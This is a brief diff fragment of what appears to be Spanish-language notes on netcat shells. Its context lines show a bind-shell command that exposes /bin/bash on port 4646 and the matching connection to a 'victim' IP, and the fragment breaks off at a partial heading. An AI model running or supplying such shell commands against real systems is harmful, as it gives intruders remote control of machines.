@@ -48,3 +48,5 @@ nc -nlvp 4646 -e /bin/bash
 nc IPvictima 4646
 
 ```
+
+### Funci
